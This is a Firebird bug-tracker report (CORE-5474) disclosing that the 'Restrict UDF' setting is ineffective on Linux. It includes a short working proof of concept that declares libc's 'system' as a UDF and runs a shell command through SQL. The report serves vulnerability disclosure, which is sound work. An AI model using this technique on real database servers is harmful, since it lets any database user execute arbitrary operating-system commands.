
'Restrict UDF' is not effective, because fbudf.so is dynamically linked against libc
------------------------------------------------------------------------------------

                Key: CORE-5474
                URL: http://tracker.firebirdsql.org/browse/CORE-5474
            Project: Firebird Core
         Issue Type: Bug
         Components: UDF
   Affects Versions: 2.5.6
        Environment: Linux X86_64
           Reporter: George Noseevich
           Assignee: Alexander Peshkov
           Priority: Critical
            Fix For: 2.5.7, 3.0.2, 4.0 Alpha 1


The default setting for UDF access when installing firebird 2.5.6 on linux is 'UdfAccess = Restrict UDF', which allows access to any symbols defined in udf libraries shipped with firebird within UDF folder. There are two libraries there - fbudf.so and ib_udf.so. Both of them are dynamically linked with libc:
ldd /opt/firebird/UDF/fbudf.so          
	linux-vdso.so.1 (0x00007fff4e129000)
	libm.so.6 => /usr/lib/libm.so.6 (0x00007f38b1389000)
	libpthread.so.0 => /usr/lib/libpthread.so.0 (0x00007f38b116c000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007f38b0dce000)
	/usr/lib64/ld-linux-x86-64.so.2 (0x000055562c490000)
Any DB user can use this to escalate his privileges to code execution:
    DECLARE EXTERNAL FUNCTION EXEC cstring(4096), integer RETURNS integer BY VALUE ENTRY_POINT 'system' MODULE_NAME 'fbudf' ;
    select first 1 EXEC('touch /tmp/proof') from some_table;
If this is a design decision, this should be more clearly documented (current comments in firebird.conf suggest that 'restricted' UDF provides some additional protection as opposed to None). If not, this should probably be fixed by statically linking all that is needed by these .so files and double-checking that the exports table is fine.
I also think it is a good idea to provide some level of additional access control for external functions. I.e. only SYSDBA or selected users can declare/alter/drop external functions. 
